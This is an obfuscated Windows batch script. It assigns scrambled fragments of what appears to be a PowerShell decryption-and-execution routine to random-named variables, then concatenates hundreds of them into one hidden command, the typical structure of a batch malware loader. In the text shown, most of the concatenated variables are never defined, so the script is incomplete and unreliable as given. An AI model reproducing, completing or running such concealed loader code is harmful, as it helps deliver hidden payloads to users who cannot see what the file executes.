@echo off
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "QkzcXcWqVk=ress"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "aHxzIPtJuv=ds_v"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "SQOQGAWtNQ=r){$"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "cZwLkNLRnc=_var"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "LdnTxHlXhi=dStr"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "lSjoibosTJ=m_va"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "wCEDFGHgLE=.Cip"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "vVMVeYJSTc=var)"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "tmulxMrFcm=ion "
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "CSyoLLtvKB=func"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "BezHuMRPaD=ce('"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "lNuBJzWmtS=n ex"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "LMxWplyrJN=stem"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "lJbZsOVYlb=tem."
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "ONqDkVLNYr=cyz="
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "kPZlsezHkg=.Dis"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "iSDEkMrQpb=plac"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "rWIsjSJWLj=Base"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "SNoaKvvarA=;$de"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "fCFmKywrYl=togr"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "KdwDRmZogm=ect "
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "DwAbEIrkqL=;fun"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "SVYyQHybUP=ing["
%DnWCmCrUzA%%DuIunkFyqW%%FbEqWNVMTe%%YZiqQItgUS%%IyZhKjTCbU%%lIlTTCJFFy%%GFavCDlrEE%%RyDxohcwGN%%UtKZSpOoxo%%ZNBwmcxDFh%%XBYwcNfNEL%%zmZREnVbDn%%OXUpFdXhlm%%JzRzQsuoWf%%jaJLOMOJRY%%hvZrsaHIQZ%%QYCscavAbl%%SHfydNniAT%%pnpmfnzzgP%%LMxWplyrJN%%qoHFgAqBnE%%MyhXJCIpnO%%BVtlzgjiiR%%pWzNCaFJgE%%XXlCdnEAnM%%DidVmvVvfZ%%qhswpPZuuJ%%WYjIQEJRim%%BJVvogSDAh%%fkDgoQEPnn%%okfDQEZveI%%LdnTxHlXhi%%WvTnDMucua%%ZUEUYrErFK%%hxySwbWKIH%%EHIeqSqSae%%jWaeIRztUg%%cUrwbzWbRB%%PKtMwslzDf%%bMqBAkwujE%%BDPCEJplcR%%VoazoyCnIq%%FaPPeqDQWQ%%cCSmZmVRiM%%cZwLkNLRnc%%HiMSZBNaxn%%gzplPtvOzc%%DLfWoFDdEr%%FLDTjTQZnx%%yUtVFCKlWQ%%rXskyWdQEt%%YKvfHvWvcW%%DwAbEIrkqL%%VshOaItsvn%%PZuUzOzonk%%FoiZnUwqGP%%ETzTxFCHeZ%%bEaPgDbGCP%%jdXgfHjhAg%%mdLFIWABwT%%lSjoibosTJ%%SQOQGAWtNQ%%vugYNYSugj%%dAjIErUJXe%%sRoRnwpUYi%%ahOGxRLkAk%%iTlKGsGfmp%%GnvJxEgpKr%%JYwYiVMDkM%%FJiNVzFEkV%%PjIICNLeiS%%KwAjAkxnBK%%GdUzKWeHNY%%ZCePBzpNwv%%jHurbijYnK%%bsczoMoiYF%%IerkTisKIb%%UKQfAZICxB%%MgucWHzEBP%%khORNfpkyT%%QzqlQrBXZp%%eMKwSBKonm%%JNjSQNVZsv%%JxeELnQimE%%fCFmKywrYl%%vbXmkcqxvc%%wCEDFGHgLE%%LBcIggiXis%%rEahaIASuI%%XsNjiCXbGd%%RqFuzTZofd%%TspcLRCxDW%%gPMcGsOSAD%%igqeBaYGIh%%JlNqOEdKyq%%aAyJWbDCNg%%fhOBUMckBK%%TVOvnVcvoc%%pdtjDIIGhz%%xvTBbCxlwb%%CSjNweLcwb%%ZioKRcNFYm%%evdcnycnuL%%yQZmzwUGMy%%WFkfzpgiKZ%%PSnjXgPgAY%%cyIKDjiclv%%hgSzpylYDY%%sUDuWGDPpt%%HNfNwyXzBp%%geXoRIZNUy%%VQDCFhVnOX%%FsNROubedR%%BLwnRoXoCo%%GQVQyQkDho%%CJLEJOrfAx%%HUJcWjupKr%%kGKAqPwWtX%%jxWPoRaRDd%%XRNeGMgTUp%%vUTQdWYknU%%ruMDokXUNe%%jCMHutSFTE%%ICbeBoDgLs%%TPEJLCfkQw%%PmgPfTilvK%%dsrJlOtIbZ%%GQiultYcWS%%nIPwOwwmYI%%frLapAyUyW%%jwjRQYeLDM%%VgpDwvDUUO%%sgKsTofhfL%%VdEZJRzYGP%%sKIlNZbhEU%%WDaJEcMQXB%%TWGSQRCqTF%%WFnewHyyFU%%mXDlOrcUuH%%fIbeWvePvV%%xLnYYrpVmX%%DnlcpVtvez%%PHVmznEjib%%CJdJxBJEmw%%bhIxdRxYPa%%bIKVgPPbzK%%NgNkuUkBFN%%mPiIxHZxjI%%PFthZTYhDH%%LIfCIUtxdi%%GWsbOmAcyy%%QrRQUhMGkA%%WdXYbDKGZC%%oBuabTnssN%%tVIfQuRoHB%%iNmDmDYtZl%%CTcVkpXQOb%%UunxgauSiH%%MvZyuBoROy%%UTshlzTNVA%%wazGGNzPwl%%jglsyhUEBJ%%agcqgacgmG%%hGXHlMVsRG%%bzuCpOHaIe%%FomlzqYiAF%%LsDPeCiDgM%%lBMUHBLzbr%%tcxibSuLiU%%NMSlUIVFxM%%FeTWSdBrEY%%EygimJUvOl%%hxvmYyIBZY%%FgboMoiBpX%%rcgjppFKZl%%OAQmFhJHXu%%uarGsywRvY%%AsfQUfqlWJ%%SYBOkepPJE%%FBEVDqKARR%%SNoaKvvarA%%RxKoBwyDvn%%iHiRsYOjmD%%uPueQeJBeP%%JoxjMhQpuh%%ShfDIlFxIL%%GlOOfbdGyw%%MXyGEUjYek%%hyPfLmKQwE%%zmSsixAJdL%%ekRXuUIyZO%%cGsxDhvIcS%%rnjTXAegxg%%tzVtgXGSLQ%%ElRICSUvOb%%cSHkuRaYZU%%QCbSuCLZrG%%ADXlofwBqf%%GJrwdBSKZp%%WISRackYoZ%%gUeiAzUvWo%%uzHUoglFOS%%KbacJSKflm%%UxnrYLFiVE%%HxNKUxaYCU%%QFjwpfUbyI%%OOkKtWlqWD%%BcJklnnphm%%SMDrvpoRbS%%QDJnPSmdqX%%lJbZsOVYlb%%SFTmQclToe%%IupeMXswus%%ajZkaiKDYG%%upGaZlJxwN%%GtOmoRuXnv%%vyESbIGJmH%%rIUIJsOoeB%%oVZHMGvMVj%%ONqDkVLNYr%%EakPvXygCW%%cfTLgAyWfu%%nTNdTEsrxN%%HaqNWnKkmP%%hojZgJUEwK%%xPIEdLmhWR%%EhJPpcPfOS%%PoJqmZJNWj%%JOVMqSsLJk%%bDovkaEuKd%%TOPDUjfrse%%czkMhQmWyx%%KdwDRmZogm%%uodTqVYrSh%%MatFiCsBot%%OIWntPsmLI%%jQlfJNvrwl%%SUerKJKQvp%%UyaNxMsPzA%%DMGjYWPnVu%%gafcAUDEDK%%fBQvOKQxIX%%vFSWIgnUtN%%UxUajTsYnD%%jNmOubVkvn%%grFYZAijtt%%GIlPQIGQmU%%sSkeOHsdBG%%ldygHCSWbI%%LjETXACxYM%%ueXAVogAkr%%heHNhCjehn%%PKPDjinrhn%%eVfOlhfYlt%%wrLJBGBRMu%%qypKWKpurM%%aPtWnmYTBa%%wlTORyZgcD%%GwEMXGFvRB%%SLGysGYOwo%%HIpLXeEASy%%KirOfDkGZG%%GDbZhLEuvl%%zkJNVYgTOS%%beCtQJtSsP%%vrOPIeGqEm%%AkfHYAyDSh%%wrShEBbIjy%%sLbGPhwUfQ%%rQoCsRZUuq%%kPZlsezHkg%%cYgfTOiySR%%eEybQFcqPN%%BhnSoCLQoK%%IOJYOsKjIE%%JBbDmFqYvM%%bjRxFVKnRr%%csjhipUAnx%%VTIleafKGI%%lNuBJzWmtS%%IwsqBrrTuX%%LQKYQiBGtE%%PZHjfoXIyJ%%sHguPzArJN%%IlqJWvdwKA%%YqTOdIOjln%%tJvKFdJpir%%HjXGVDJYmK%%kAXXLbOsrg%%KrfwtZQFeT%%LNntTOtnTz%%ZQXBcTLxZD%%orYcGpeAmV%%NdTsYwmEeW%%IBzRhTuEtA%%nsFAEtPlMD%%KSaXLVWECF%%GhtdUNSgUM%%VAhMIvxsNF%%HbRBmPACfm%%WPbNUgZCFR%%AIrZHjKnpq%%xERXYFqRQe%%mqaHQfytSC%%vVMVeYJSTc%%fnnOOsYePo%%PiLBFkIJjC%%KqvMVCRVTZ%%VyXNZZdlTx%%guEDMnjlqT%%qaIrsORATm%%BclPtrkYBF%%gwQMvqMRaH%%tFFZJUPGvl%%hDsGVejOju%%dlKKNTkWVb%%bZzlTWxmgz%%BDCpyDejQr%%hYIFEhUUlP%%KTKujhegNZ%%GXHKTzIumj%%PbfEUdrTHL%%bDarPITigq%%zXvRKjqXMf%%zzHcaIOfzg%%QkzcXcWqVk%%GzoWKRFnTK%%MthBlBVYrg%%UNJZApytTH%%nacByZlLri%%dAlOtwdXQw%%hYZOqSQpwv%%tmulxMrFcm%%qkGidtBUGd%%lADxAobolG%%iWoVPQfarH%%fxUDgWsQLW%%rWIsjSJWLj%%LduwduWKtm%%oBCZYOGZrE%%WkCopmnVMX%%hjoiWcdxAL%%aHxzIPtJuv%%mJFhmAAghR%%haYweemudW%%KiyFDoNdFz%%SDBqKyDhVv%%BXqJEaIauD%%DZGxLekaDY%%MwAIYDyILG%%BezHuMRPaD%%GMJbWTWdFG%%nDEXJfxHKa%%BapNcyzZdY%%mvZZrZNyMe%%HucetYACXp%%pjeZbFxVZx%%tWaGuREEFK%%rYVFthXkue%%XXcNIcqZXM%%CSyoLLtvKB%%uVWnYroyGU%%HmAVAwUnYr%%BEGTizzGUI%%NBzSKcaPPq%%ORsdeprDOo%%RgxtaPodfy%%RHEYhgMIlx%%veyHDJlDOS%%iWSGQHegSU%%NXJqzgnuWY%%DIrqSMHPPq%%DLomqVPXhz%%bFPrKyvhix%%wRHQpzEBNe%%ZpqBqbIxZD%%rpmwWXSaFu%%rAGsUMdxXR%%qnkcAMooaI%%PXhEfgElUs%%GEWtNyIYHD%%XkAindfkVk%%IEaWEtscmN%%iSDEkMrQpb%%eqGwLExZrc%%auqJKbDZPu%%gGLTvfHVYA%%MoUTfrXDlZ%%VtKkNOCTUi%%isbUVyFNbF%%XCbRpMzwDs%%eZNPyNVAgH%%DNaPrunZYH%%LkCGbtsTVa%%ofpBejElwi%%CfHtcjBlzV%%zzxWHTwhOf%%ucEfsxxyKi%%PbDQfFCjDR%%RguZBPItUk%%MxxqNAABbF%%LcBqgyWHQb%%qnDWooIFDD%%PeEzwrDndE%%fbhYfOFdSd%%SaCTTyUBbz%%SVYyQHybUP%%UJEmVpgEQA%%IEMzKOCLGX%%wblDMkdJiy%%pEjdijvqXD%%sqLBQniyNb%%fNvWtTxazL%%mxwrkevJqA%%slNcFgqJNz%%bEVgtCimJp%%LvRlrUTtrL%%RyhnITZsqn%%DOmaJIBpYI%%VjZbOXuCLL%%mWsbHCwIxz%%CQVwMXiRBJ%%tEvIQIzgyL%%zxHFaGwlsg%
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "jSXKZODewF=exit"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "cTELPeQrQy= /b"
%jSXKZODewF%%cTELPeQrQy%
